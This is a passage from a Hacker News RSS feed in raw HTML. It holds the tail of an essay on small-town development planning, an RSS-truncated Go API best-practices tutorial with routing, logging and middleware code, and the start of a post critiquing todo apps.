</p><hr><p>

Generally speaking, planning and development work for a small town or unincorporated community should look more like homeschooling than like public school. The bureaucratic processes found in bigger cities mostly are not going to be helpful at a very small scale. 
</p><p>

Just like with homeschooling, most bureaucratic processes will be actively counterproductive for small scale development work. Of course you will need to comply with certain things, just like we needed to file paperwork annually and keep some records to legally homeschool. 
</p><p>
But you should actively seek to avoid having your valuable time consumed with the bureaucratic window dressing parts of planning and economic development. If you want to be effective doing small scale development work, you want to identify the parts that matter and actively ditch the parts that are merely bureaucratic processes aimed at managing a planning process on a large scale with many people. 

</p><p>

Metaphorically, you want to keep the "three hours of learning" and ditch the "five hours of bureaucratic processes" like I did as a homeschooling parent.

</p><ul><li>
You will want to put together some basic information about where the community stands currently and what some of the pain points are.
</li><li>
Based on a list of assets and pain points, you will want to set some goals. 
</li><li>
From there, you should seek to provide solutions for the least amount of time and effort possible.
</li></ul><p>

Try hard to avoid scenarios where you tell yourself "First, we need x before we can do y." In many cases, that amounts to making excuses rather than making plans.

</p><p>
If poverty is an issue, try to find answers in the here and now, such as <a href="http://writepay.blogspot.com/">earning money online</a> or helping locals raise some of their own food. You could start a community garden or even just check your <a href="https://www.gardeningknowhow.com/extension-search">local County Extension</a> office for <a href="https://www.reddit.com/r/CitizenPlanners/comments/fn3jno/county_extension_services/">help putting out information on container gardening</a>.
</p><p>
If physical health is a concern, don't tell yourself that your tiny town needs a doctor or hospital that it can't possibly support. Instead, start a healthy recipe club, a community garden or a walking club. Diet and exercise are both first lines of defense for good health and are immediately accessible by anyone.

</p><p>


Of course, as you grow your needs and processes may need to change and there can certainly be value in jumping through the hoops to do things in a more formal way. Sometimes, that's the only way to access state funds, federal technical assistance and similar.
</p><p>
Just make sure you have a good reason to jump through those hoops and you aren't doing it because you imagine "That's how development works because that's what they do in bigger cities." If there isn't a concrete payoff that cannot be achieved without jumping through those hoops, it's possibly just bureaucratic window dressing that your small community can ill afford to waste its limited resources on.




</p></div>
</div></div>]]>
            </description>
            <link>http://www.eclogiselle.com/2020/10/small-scale-development-work.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927340</guid>
            <pubDate>Thu, 29 Oct 2020 04:49:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Which best practices would you add to this list?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927327">thread link</a>) | @jonnylangefeld
<br/>
October 28, 2020 | https://jonnylangefeld.com/blog/how-to-write-a-go-api-the-ultimate-guide | <a href="https://web.archive.org/web/*/https://jonnylangefeld.com/blog/how-to-write-a-go-api-the-ultimate-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        


        <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p><img src="https://jonnylangefeld.com/assets/posts/gopher.svg" width="35%"></p>

<p>‚ÄúTIL‚Äù (<a href="https://www.urbandictionary.com/define.php?term=TIL">today I learned</a>) is an acronym I recently discovered (Example usage: ‚ÄúTIL what TIL means‚Äù). Since I‚Äôm ESL (<a href="https://www.urbandictionary.com/define.php?term=ESL">English as Second Language</a>) I use the urban dictionary a lot to look up these acronyms. ‚ÄúTIL‚Äù turned out to be a very useful term, because it‚Äôs true: One never stops learning. And so it happened that I started this blog writing about <a href="https://jonnylangefeld.com/blog/python-flask-base-project">a Python Flask API</a> and continued with a three part series on <a href="https://jonnylangefeld.com/blog/how-to-write-a-go-api-part-1-webserver-with-iris">how to write a go API</a>. And while there is a lot of valuable information in those posts, today I am writing about what I learned since then and what my current set of best practices is to write an efficient and production ready API.</p>

<p>Reading many blogs myself, I sometimes miss context on given examples. So I published a sample repo which can be found on <a href="https://jonnylangefeld/go-api">github</a>. Every code example in this post links to the source lines of this repo.</p>

<p>The following paragraphs feature a large set of best practices and why I like them. Send me an <a href="https://jonnylangefeld.com/about#contactform">email</a> or tweet me <a href="https://twitter.com/jonnylangefeld">@jonnylangefeld</a> if you feel like something is missing!</p>

<!--more-->

<p><strong>Table of Contents</strong></p>

<ul>
  <li><a href="#1-project-scaffolding">1. Project Scaffolding</a></li>
  <li><a href="#2-the-toolsgo-pattern">2. The tools.go Pattern</a></li>
  <li><a href="#3-command-line-flags-with-pflag">3. Command Line Flags With pflag</a></li>
  <li><a href="#4-structured-logging-with-zap">4. Structured Logging With zap</a></li>
  <li><a href="#5-graceful-exits">5. Graceful Exits</a></li>
  <li><a href="#6-log-version-on-startup">6. Log Version on Startup</a></li>
  <li><a href="#7-define-types-in-their-own-package">7. Define Types in Their Own Package</a></li>
  <li><a href="#8-chi-as-http-framework">8. chi as HTTP Framework</a></li>
  <li><a href="#9-custom-middlewares">9. Custom Middlewares</a></li>
  <li><a href="#10-pagination">10. Pagination</a></li>
  <li><a href="#11-database-integration-with-gorm">11. Database Integration With gorm</a></li>
  <li><a href="#12-database-integration-tests-with-dockertest">12. Database Integration Tests With dockertest</a></li>
  <li><a href="#13-api-integration-tests-with-gomock">13. API Integration Tests With gomock</a></li>
  <li><a href="#14-render-responses-with-go-chirender">14. Render Responses With go-chi/render</a></li>
  <li><a href="#15-documentation-as-code-with-http-swagger">15. Documentation as Code With http-swagger</a></li>
  <li><a href="#16-staged-dockerfile">16. Staged Dockerfile</a></li>
</ul>

<h3 id="1-project-scaffolding">1. Project Scaffolding</h3>

<p>I use the following tree as project layout. More packages can be added under <code>pkg</code>.</p>
<div><div><pre><code>‚îú‚îÄ‚îÄ Dockerfile
‚îú‚îÄ‚îÄ Makefile
‚îú‚îÄ‚îÄ docs                    # automatically generated by `make docs`
‚îú‚îÄ‚îÄ go.mod
‚îú‚îÄ‚îÄ go.sum
‚îú‚îÄ‚îÄ main.go                 # main.go in the root rather than in `/cmd` directory
‚îú‚îÄ‚îÄ pkg
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ api                 # containing all API related functions and the router
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ api.go
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ api_test.go
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ operations.go
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ db                  # all database interactions happen in here
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ db.go
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ db_test.go
‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ middelware          # for custom middlewares
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îú‚îÄ‚îÄ context.go
‚îÇ&nbsp;&nbsp; ‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ logger.go
‚îÇ&nbsp;&nbsp; ‚îî‚îÄ‚îÄ types               # our types get a separate package
‚îÇ&nbsp;&nbsp;     ‚îî‚îÄ‚îÄ types.go
‚îú‚îÄ‚îÄ readme.md
‚îî‚îÄ‚îÄ tools.go                # tools.go to manage tool versions via go.mod
</code></pre></div></div>

<p>With that out of the way, lets look into the <code>main.go</code> file.</p>

<h3 id="2-the-toolsgo-pattern">2. The tools.go Pattern</h3>

<p>I‚Äôm really a fan of managing tool dependencies also through go modules. That pins their versions and includes them in my vendor directory. Marco Franssen wrote in-depth about this pattern in <a href="https://marcofranssen.nl/manage-go-tools-via-go-modules/">this blog post</a>.</p>

<h3 id="3-command-line-flags-with-pflag">3. Command Line Flags With <a href="https://github.com/spf13/pflag">pflag</a></h3>

<p>There are many ways to work with command line flags and configurations in go. One can go fancy with <a href="https://github.com/spf13/viper"><code>viper</code></a> or stay simple with go‚Äôs built in <code>flags</code> package. I like <a href="https://github.com/spf13/pflag"><code>pflag</code></a> because of it‚Äôs simplicity and similarity to go‚Äôs own package, yet it offers POSIX/GNU-style flags making it more natural to use on your command line. The <a href="https://jonnylangefeld/go-api">sample repo</a> contains an example usage:</p>

<div><div><pre><code><span>func</span> <span>init</span><span>()</span> <span>{</span>
	<span>pflag</span><span>.</span><span>StringVarP</span><span>(</span><span>&amp;</span><span>addr</span><span>,</span> <span>"address"</span><span>,</span> <span>"a"</span><span>,</span> <span>":8080"</span><span>,</span> <span>"the address for the api to listen on. Host and port separated by ':'"</span><span>)</span>
	<span>pflag</span><span>.</span><span>Parse</span><span>()</span>
<span>}</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/main.go#L22-L25">source</a></em>)</sup></p>

<p>Pflag comes with help built in:</p>

<div><div><pre><code>$ go-api -h
Usage of go-api:
  -a, --address string   the address for the api to listen on. Host and port separated by ':' (default ":8080")

</code></pre></div></div>

<h3 id="4-structured-logging-with-zap">4. Structured Logging With <a href="https://github.com/uber-go/zap">zap</a></h3>

<p>This is certainly an opinionated decision, but my favorite logger is <a href="https://github.com/uber-go/zap">zap</a>. It can be configured in all kinds of ways, but I like to keep it very simple. This is the configuration I use:</p>

<div><div><pre><code><span>// configure logger</span>
<span>log</span><span>,</span> <span>_</span> <span>:=</span> <span>zap</span><span>.</span><span>NewProduction</span><span>(</span><span>zap</span><span>.</span><span>WithCaller</span><span>(</span><span>false</span><span>))</span>
<span>defer</span> <span>func</span><span>()</span> <span>{</span>
    <span>_</span> <span>=</span> <span>log</span><span>.</span><span>Sync</span><span>()</span>
<span>}()</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/main.go#L34-L38">source</a></em>)</sup></p>

<p>Which gives me a beautiful log output like the following:</p>

<div><div><pre><code><span>{</span><span>"level"</span><span>:</span><span>"info"</span><span>,</span><span>"ts"</span><span>:</span><span>1601686510.597971</span><span>,</span><span>"msg"</span><span>:</span><span>"starting up API..."</span><span>,</span><span>"version"</span><span>:</span><span>"v1.0.0"</span><span>}</span><span>
</span><span>{</span><span>"level"</span><span>:</span><span>"info"</span><span>,</span><span>"ts"</span><span>:</span><span>1601686510.70517</span><span>,</span><span>"msg"</span><span>:</span><span>"ready to serve requests on :8080"</span><span>}</span><span>
</span><span>{</span><span>"level"</span><span>:</span><span>"info"</span><span>,</span><span>"ts"</span><span>:</span><span>1601686516.446462</span><span>,</span><span>"msg"</span><span>:</span><span>"served request"</span><span>,</span><span>"proto"</span><span>:</span><span>"HTTP/1.1"</span><span>,</span><span>"method"</span><span>:</span><span>"GET"</span><span>,</span><span>"path"</span><span>:</span><span>"/articles"</span><span>,</span><span>"lat"</span><span>:</span><span>0.002087763</span><span>,</span><span>"status"</span><span>:</span><span>200</span><span>,</span><span>"size"</span><span>:</span><span>13</span><span>,</span><span>"reqId"</span><span>:</span><span>"C02C864PLVDL/gESGYmlmCu-000001"</span><span>}</span><span>
</span><span>{</span><span>"level"</span><span>:</span><span>"info"</span><span>,</span><span>"ts"</span><span>:</span><span>1601686521.3242629</span><span>,</span><span>"msg"</span><span>:</span><span>"served request"</span><span>,</span><span>"proto"</span><span>:</span><span>"HTTP/1.1"</span><span>,</span><span>"method"</span><span>:</span><span>"GET"</span><span>,</span><span>"path"</span><span>:</span><span>"/orders"</span><span>,</span><span>"lat"</span><span>:</span><span>0.002300746</span><span>,</span><span>"status"</span><span>:</span><span>200</span><span>,</span><span>"size"</span><span>:</span><span>13</span><span>,</span><span>"reqId"</span><span>:</span><span>"C02C864PLVDL/gESGYmlmCu-000002"</span><span>}</span><span>
</span><span>{</span><span>"level"</span><span>:</span><span>"info"</span><span>,</span><span>"ts"</span><span>:</span><span>1601686525.5588071</span><span>,</span><span>"msg"</span><span>:</span><span>"gracefully shutting down"</span><span>}</span><span>

</span></code></pre></div></div>

<h3 id="5-graceful-exits">5. Graceful Exits</h3>

<p>This one is not ultimately necessary but I‚Äôve seen it a lot and ensures cleanup tasks when the API is shutting down. A graceful exit is implemented by making a channel in the beginning of your program and listening for a certain event, like this one for a keyboard interrupt:</p>

<div><div><pre><code><span>// gracefully exit on keyboard interrupt</span>
<span>c</span> <span>:=</span> <span>make</span><span>(</span><span>chan</span> <span>os</span><span>.</span><span>Signal</span><span>,</span> <span>1</span><span>)</span>
<span>signal</span><span>.</span><span>Notify</span><span>(</span><span>c</span><span>,</span> <span>os</span><span>.</span><span>Interrupt</span><span>,</span> <span>syscall</span><span>.</span><span>SIGTERM</span><span>)</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/main.go#L30-L32">source</a></em>)</sup></p>

<p>At the end of the program, after starting the webserver in a go routine (see #5), we react to the signal:</p>

<div><div><pre><code><span>&lt;-</span><span>c</span>
<span>log</span><span>.</span><span>Info</span><span>(</span><span>"gracefully shutting down"</span><span>)</span>
<span>os</span><span>.</span><span>Exit</span><span>(</span><span>0</span><span>)</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/main.go#L58-L61">source</a></em>)</sup></p>

<h3 id="6-log-version-on-startup">6. Log Version on Startup</h3>

<p>This one is also minor, but it turns out to be very useful to see the version by just reading the logs for debugging. It makes it clear which exact code base ran the code and resulted in a potential error.</p>

<p>The version is injected by using an unset <code>version</code> variable in the <code>main.go</code> file and setting it via the build command (for instance in your <code>Makefile</code>):</p>

<div><div><pre><code>VERSION ?<span>=</span> <span>$(</span>shell git describe <span>--match</span> <span>'v[0-9]*'</span> <span>--tags</span> <span>--always</span><span>)</span>

build:
	@go build <span>-ldflags</span> <span>"-X main.version=</span><span>$(</span>VERSION<span>)</span><span>"</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/Makefile#L1-L4">source</a></em>)</sup></p>

<p>In the <code>main.go</code> file you can use the version as follows (after instantiating it via <code>var version string</code>):</p>

<div><div><pre><code><span>// print current version</span>
<span>log</span><span>.</span><span>Info</span><span>(</span><span>"starting up API..."</span><span>,</span> <span>zap</span><span>.</span><span>String</span><span>(</span><span>"version"</span><span>,</span> <span>version</span><span>))</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/main.go#L40-L41">source</a></em>)</sup></p>

<h3 id="7-define-types-in-their-own-package">7. Define Types in Their Own Package</h3>

<p>Types should be reusable. Let‚Äôs say someone was to build a command line interface interacting with your API, they would appreciate if they could just import your API types. So we define types as <code>struct</code>s in <code>pkg/types/types.go</code> (we will get to the struct tags and the doc strings later):</p>

<div><div><pre><code><span>// Article is one instance of an article</span>
<span>type</span> <span>Article</span> <span>struct</span> <span>{</span>
	<span>// The unique id of this item</span>
	<span>ID</span> <span>int</span> <span>`gorm:"type:SERIAL;PRIMARY_KEY" json:"id" example:"1"`</span>
	<span>// The name of this item</span>
	<span>Name</span> <span>string</span> <span>`gorm:"type:varchar;NOT NULL" json:"name" example:"Skittles"`</span>
	<span>// The price of this item</span>
	<span>Price</span> <span>float64</span> <span>`gorm:"type:decimal;NOT NULL" json:"price" example:"1.99"`</span>
<span>}</span> <span>// @name Article</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/pkg/types/types.go#L10-L18">source</a></em>)</sup></p>

<h3 id="8-chi-as-http-framework">8. <a href="https://github.com/go-chi/chi">chi</a> as HTTP Framework</h3>

<p>My http framework of choice these days is <a href="https://github.com/go-chi/chi">go-chi/chi</a> (upon recommendation by <a href="https://twitter.com/elsesiy">@elsesiy</a> - thank you!) for its light weight, idiomatic implementation, but mainly for its 100% compatibility with <code>net/http</code> allowing you to use any existing middleware.</p>

<p>The server is started as go routine and listens on the configured address:</p>

<div><div><pre><code><span>// start the api server</span>
<span>r</span> <span>:=</span> <span>api</span><span>.</span><span>GetRouter</span><span>(</span><span>log</span><span>,</span> <span>dbClient</span><span>)</span>
<span>go</span> <span>func</span><span>()</span> <span>{</span>
    <span>if</span> <span>err</span> <span>:=</span> <span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>addr</span><span>,</span> <span>r</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>log</span><span>.</span><span>Error</span><span>(</span><span>"failed to start server"</span><span>,</span> <span>zap</span><span>.</span><span>Error</span><span>(</span><span>err</span><span>))</span>
        <span>os</span><span>.</span><span>Exit</span><span>(</span><span>1</span><span>)</span>
    <span>}</span>
<span>}()</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/main.go#L49-L56">source</a></em>)</sup></p>

<p>The router gets configured in the <code>api</code> package, setting the db client and the logger:</p>

<div><div><pre><code><span>func</span> <span>GetRouter</span><span>(</span><span>log</span> <span>*</span><span>zap</span><span>.</span><span>Logger</span><span>,</span> <span>dbClient</span> <span>db</span><span>.</span><span>ClientInterface</span><span>)</span> <span>*</span><span>chi</span><span>.</span><span>Mux</span> <span>{</span>
	<span>r</span> <span>:=</span> <span>chi</span><span>.</span><span>NewRouter</span><span>()</span>
	<span>r</span><span>.</span><span>Use</span><span>(</span><span>middleware</span><span>.</span><span>RequestID</span><span>)</span>
	<span>SetDBClient</span><span>(</span><span>dbClient</span><span>)</span>
	<span>if</span> <span>log</span> <span>!=</span> <span>nil</span> <span>{</span>
		<span>r</span><span>.</span><span>Use</span><span>(</span><span>m</span><span>.</span><span>SetLogger</span><span>(</span><span>log</span><span>))</span>
	<span>}</span>
	<span>buildTree</span><span>(</span><span>r</span><span>)</span>

	<span>return</span> <span>r</span>
<span>}</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/pkg/api/api.go#L31-L41">source</a></em>)</sup></p>

<p>The tree of requests looks in code just as it would like in a folder structure. Every sub request is attached to its parent. Here is an example request tree, that handles articles and orders for a store:</p>

<div><div><pre><code><span>func</span> <span>buildTree</span><span>(</span><span>r</span> <span>*</span><span>chi</span><span>.</span><span>Mux</span><span>)</span> <span>{</span>
	<span>r</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/swagger"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>http</span><span>.</span><span>Redirect</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>r</span><span>.</span><span>RequestURI</span><span>+</span><span>"/"</span><span>,</span> <span>http</span><span>.</span><span>StatusMovedPermanently</span><span>)</span>
	<span>})</span>
	<span>r</span><span>.</span><span>Get</span><span>(</span><span>"/swagger*"</span><span>,</span> <span>httpSwagger</span><span>.</span><span>Handler</span><span>())</span>

	<span>r</span><span>.</span><span>Route</span><span>(</span><span>"/articles"</span><span>,</span> <span>func</span><span>(</span><span>r</span> <span>chi</span><span>.</span><span>Router</span><span>)</span> <span>{</span>
		<span>r</span><span>.</span><span>With</span><span>(</span><span>m</span><span>.</span><span>Pagination</span><span>)</span><span>.</span><span>Get</span><span>(</span><span>"/"</span><span>,</span> <span>ListArticles</span><span>)</span>

		<span>r</span><span>.</span><span>Route</span><span>(</span><span>"/{id}"</span><span>,</span> <span>func</span><span>(</span><span>r</span> <span>chi</span><span>.</span><span>Router</span><span>)</span> <span>{</span>
			<span>r</span><span>.</span><span>Use</span><span>(</span><span>m</span><span>.</span><span>Article</span><span>)</span>
			<span>r</span><span>.</span><span>Get</span><span>(</span><span>"/"</span><span>,</span> <span>GetArticle</span><span>)</span>
		<span>})</span>

		<span>r</span><span>.</span><span>Put</span><span>(</span><span>"/"</span><span>,</span> <span>PutArticle</span><span>)</span>
	<span>})</span>

	<span>r</span><span>.</span><span>Route</span><span>(</span><span>"/orders"</span><span>,</span> <span>func</span><span>(</span><span>r</span> <span>chi</span><span>.</span><span>Router</span><span>)</span> <span>{</span>
		<span>r</span><span>.</span><span>With</span><span>(</span><span>m</span><span>.</span><span>Pagination</span><span>)</span><span>.</span><span>Get</span><span>(</span><span>"/"</span><span>,</span> <span>ListOrders</span><span>)</span>

		<span>r</span><span>.</span><span>Route</span><span>(</span><span>"/{id}"</span><span>,</span> <span>func</span><span>(</span><span>r</span> <span>chi</span><span>.</span><span>Router</span><span>)</span> <span>{</span>
			<span>r</span><span>.</span><span>Use</span><span>(</span><span>m</span><span>.</span><span>Order</span><span>)</span>
			<span>r</span><span>.</span><span>Get</span><span>(</span><span>"/"</span><span>,</span> <span>GetOrder</span><span>)</span>
		<span>})</span>

		<span>r</span><span>.</span><span>Put</span><span>(</span><span>"/"</span><span>,</span> <span>PutOrder</span><span>)</span>
	<span>})</span>
<span>}</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/pkg/api/api.go#L43-L70">source</a></em>)</sup></p>

<h3 id="9-custom-middlewares">9. Custom Middlewares</h3>

<p>In the tree above, you can spot the usage of</p>

<div><div><pre><code>		<span>r</span><span>.</span><span>Route</span><span>(</span><span>"/{id}"</span><span>,</span> <span>func</span><span>(</span><span>r</span> <span>chi</span><span>.</span><span>Router</span><span>)</span> <span>{</span>
			<span>r</span><span>.</span><span>Use</span><span>(</span><span>m</span><span>.</span><span>Article</span><span>)</span>
			<span>r</span><span>.</span><span>Get</span><span>(</span><span>"/"</span><span>,</span> <span>GetArticle</span><span>)</span>
		<span>})</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/pkg/api/api.go#L52-L55">source</a></em>)</sup></p>

<p>Custom middlewares live in the <code>middleware</code> package. <code>m</code> is our custom middleware, imported through</p>

<div><div><pre><code><span>m</span> <span>"github.com/jonnylangefeld/go-api/pkg/middelware"</span>
</code></pre></div></div>
<p><sup>(<em><a href="https://github.com/jonnylangefeld/go-api/blob/v1.0.0/pkg/api/api.go#L13">source</a></em>)</sup></p>

<p>Custom middlewares are very powerful. They are basically an injection into the sequence of handlers of the api and can do anything ‚Äòalong the way‚Äô. In this instance we know we are in a part of our router tree, that will always require the article object pulled from the database. So we inject a custom middleware, that does exactly that for us and injects it into the context of the request. The context is available through the entire handler chain, so for any succeeding handler our object will be available.</p>

<p>The following middelware is the <code>http.Handler</code> we used above via <code>r.Use(m.Article)</code> and injects the article object into the context.</p>

<div><div><pre><code><span>// Article middleware is used to load an Article object from</span>
<span>// the URL parameters passed through as the request. In case</span>
<span>// the Article could not be found, we stop here and return a 404.</span>
<span>func</span> <span>Article</span><span>(</span><span>next</span> <span>http</span><span>.</span><span>Handler</span><span>)</span> <span>http</span><span>.</span><span>Handler</span> <span>{</span>
	<span>return</span> <span>http</span><span>.</span><span>HandlerFunc</span><span>(</span><span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>var</span> <span>article</span> <span>*</span><span>types</span><span>.</span><span>Article</span>

		<span>if</span> <span>id</span> <span>:=</span> <span>chi</span><span>.</span><span>URLParam</span><span>(</span><span>r</span><span>,</span> <span>"id"</span><span>);</span> <span>id</span> <span>!=</span> <span>""</span> <span>{</span>
			<span>intID</span><span>,</span> <span>err</span> <span>:=</span> <span>strconv</span><span>.</span><span>Atoi</span><span>(</span><span>id</span><span>)</span>
			<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
				<span>_</span> <span>=</span> <span>render</span><span>.</span><span>Render</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>types</span><span>.</span><span>ErrInvalidRequest</span><span>(</span><span>err</span><span>))</span>
				<span>return</span>
			<span>}</span>
			<span>article</span> <span>=</span> <span>DBClient</span><span>.</span><span>GetArticleByID</span><span>(</span><span>intID</span><span>)</span>
		<span>}</span> <span>else</span> <span>{</span>
			<span>_</span> <span>=</span> <span>render</span><span>.</span><span>Render</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>types</span><span>.</span><span>ErrNotFound</span><span>())</span>
			<span>return</span>
		<span>}</span>
		<span>if</span> <span>article</span> <span>==</span> <span>nil</span> <span>{</span>
			<span>_</span> <span>=</span> <span>render</span><span>.</span><span>Render</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>types</span><span>.</span><span>ErrNotFound</span><span>())</span>
			<span>return</span>
		<span>}</span>

		<span>ctx</span> <span>:=</span> <span>context</span><span>.</span><span>WithValue</span><span>(</span><span>r</span><span>.</span><span>Context</span><span>(),</span> <span>ArticleCtxKey</span><span>,</span> <span>article</span><span>)</span>
		<span>next</span><span>.</span><span>ServeHTTP</span><span>(</span><span>w</span><span>,</span>‚Ä¶</code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jonnylangefeld.com/blog/how-to-write-a-go-api-the-ultimate-guide">https://jonnylangefeld.com/blog/how-to-write-a-go-api-the-ultimate-guide</a></em></p>]]>
            </description>
            <link>https://jonnylangefeld.com/blog/how-to-write-a-go-api-the-ultimate-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927327</guid>
            <pubDate>Thu, 29 Oct 2020 04:47:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Todo apps are meant for robots]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927203">thread link</a>) | @w1nter
<br/>
October 28, 2020 | https://blog.frantic.im/all/todo-apps-are-meant-for-robots/ | <a href="https://web.archive.org/web/*/https://blog.frantic.im/all/todo-apps-are-meant-for-robots/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In&nbsp;my lifetime I‚Äôve tried a&nbsp;dozen todo apps. In&nbsp;the&nbsp;beginning they all seem different, novel and&nbsp;special. Slick UI, shortcuts, tags, subtasks, the&nbsp;list goes on&nbsp;and&nbsp;on.</p>
<p>But&nbsp;all our stories were the&nbsp;same: I start using the&nbsp;new app, then after awhile I stop using it.</p>
<p>Up until the&nbsp;last week I thought the&nbsp;problem was in&nbsp;myself (you probably think so too). After all, <a href="https://gettingthingsdone.com/">David Allen</a> seems to&nbsp;have figured this shit out. Also there are people leaving long 5 star reviews on&nbsp;every major todo list app, they discuss them on&nbsp;forums, recommend them to&nbsp;friends.</p>
<p>But&nbsp;then I read <a href="https://notes.andymatuschak.org/Close_open_loops?stackedNotes=z5tiFxnNKMZCnc8G9R1N51L5hknyRGmyCQx18&amp;stackedNotes=z8aZybuJJopS5fL7TnPou2JcmCsBUJeqirbBh&amp;stackedNotes=z5vXaKVAPBNKAAi9RXNudduhyGadGXqtMVTEs">Andy Matuschak‚Äôs notes</a>, and&nbsp;it really resonated with me. What if I‚Äôm a&nbsp;left-handed person in&nbsp;the&nbsp;world of&nbsp;right-handed tools? All popular todo apps out there have the&nbsp;same problems:</p>

<ol start="1">
<li>Willpower needed to&nbsp;make decisions is a&nbsp;limited resource. And&nbsp;most TODO apps are lazy and&nbsp;don‚Äôt consider the&nbsp;impact on&nbsp;your willpower. You want to&nbsp;postpone a&nbsp;task? Please enter the&nbsp;exact date to&nbsp;postpone this to. Which project to&nbsp;add this to? Tags? Subtasks? The&nbsp;amount of&nbsp;things one can customize is really large, but&nbsp;making all this decisions has a&nbsp;cost.</li>
</ol>
<ol start="2">
<li>Long lists are overwhelming. TODO apps are all about lists. And&nbsp;these lists tend to&nbsp;get large when the&nbsp;tasks inflow exceeds the&nbsp;tasks outflow (i.e. every modern knowledge worker‚Äôs queue). Looking at&nbsp;the&nbsp;ever-growing list of&nbsp;things that need to&nbsp;get done is not&nbsp;inspiring to&nbsp;say the&nbsp;least. As&nbsp;the&nbsp;lists get longer, there‚Äôs less and&nbsp;less chance that anything from it will get done, which also decreases the&nbsp;motivation to&nbsp;look into these lists. Removing stuff without getting it done is also painful, it requires a&nbsp;complex emotional and&nbsp;rational decision to&nbsp;be made (see the&nbsp;point about the&nbsp;willpower above).</li>
</ol>
<ol start="3">
<li>Sense of&nbsp;accomplishment is important but&nbsp;rare in&nbsp;the&nbsp;digital world. When you mark a&nbsp;task as&nbsp;done in&nbsp;your TODO app, it just hides it. That‚Äôs it, no&nbsp;reward, no&nbsp;sense of&nbsp;accomplishment (unless you make your own). I think that‚Äôs why some people like Trello or&nbsp;pen-and-paper TODO list: when you get something done, you can see a&nbsp;card moved or&nbsp;a&nbsp;text crossed out. An&nbsp;artifact that proves there was a&nbsp;task here, and&nbsp;now it‚Äôs done. Now you are one step closer to&nbsp;your goal.</li>
</ol>
<ol start="4">
<li>We need to&nbsp;trust our systems. GTD works only when you follow the&nbsp;rules. If you let your inbox grow unbound, the&nbsp;whole point about GTD gets lost and&nbsp;you also start losing trust in&nbsp;GTD. Another negative feedback loop. I‚Äôve never seen a&nbsp;TODO app that lets you recover from this downward spiral.</li>
</ol>
<ol start="5">
<li>Tasks are not&nbsp;the&nbsp;same. Get milk, write an&nbsp;essay, plan a&nbsp;vacation, reconnect with a&nbsp;friend. These are things of&nbsp;different magnitude, different emotional connection, different context and&nbsp;time commitment. Some tasks aren‚Äôt even tasks, e.&nbsp;g. simply items to&nbsp;keep track of&nbsp;or&nbsp;be reminded of. But&nbsp;TODO apps treat them the&nbsp;same. They get the&nbsp;similar looking rows neatly organized in&nbsp;a&nbsp;unified interface.</li>
</ol>
<ol start="6">
